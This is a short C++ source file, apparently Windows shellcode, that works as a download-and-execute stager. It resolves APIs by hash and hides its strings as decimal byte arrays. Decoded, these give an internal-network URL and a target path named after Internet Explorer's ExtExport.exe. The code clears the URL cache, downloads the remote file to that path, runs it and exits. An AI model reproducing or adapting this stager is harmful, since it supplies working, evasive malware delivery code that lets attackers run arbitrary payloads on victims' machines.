/*
	Author: y11en
	Data: 2020.4
*/

#include "one.h"
#include "sc.h"


BOOL WINAPI DeleteUrlCacheEntryA(
	__in  LPCTSTR lpszUrlName
);


using T_DeleteUrlCacheEntryA = decltype(&DeleteUrlCacheEntryA);
#define H_DeleteUrlCacheEntryA 0x350ba62d

using T_URLDownloadToFileA = decltype(&URLDownloadToFileA);
#define H_URLDownloadToFileA 0x213ae0e3



void* sc_d2e()
{

	NativeApi func;
	HMODULE winnet, urlmon;

	T_URLDownloadToFileA	download;
	T_DeleteUrlCacheEntryA delcache;

	BYTE str_winnet[] = { 87, 105, 110, 105, 110, 101, 116, 46, 100, 108, 108, 0 };
	BYTE str_urlmon[] = { 117, 114, 108, 109, 111, 110, 46, 100, 108, 108, 0};

	BYTE str_url[] = { 104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 56, 46, 55, 50, 46, 49, 47, 49 , 0};
	BYTE str_path[] = { 67, 58, 92, 80, 114, 111, 103, 114, 97, 109, 32, 70, 105, 108, 101, 115, 32, 40, 120, 56, 54, 41, 92, 73, 110, 116, 101, 114, 110, 101, 116, 32, 69, 120, 112, 108, 111, 114, 101, 114, 92, 69, 120, 116, 69, 120, 112, 111, 114, 116, 46, 101, 120, 101, 0};

	init_api(&func);

	winnet = func.loadlib((LPCSTR)str_winnet);
	urlmon = func.loadlib((LPCSTR)str_urlmon);
	

	GET_FUNC(winnet, H_DeleteUrlCacheEntryA, delcache, 0);
	GET_FUNC(urlmon, H_URLDownloadToFileA, download, 0);

	delcache((LPCTSTR)str_url);
	download(0, (LPCSTR)str_url, (LPCSTR)str_path, 0, 0);
	func.winexec((LPCSTR)str_path, 0);
	func.exitme(0);

	return 0;
}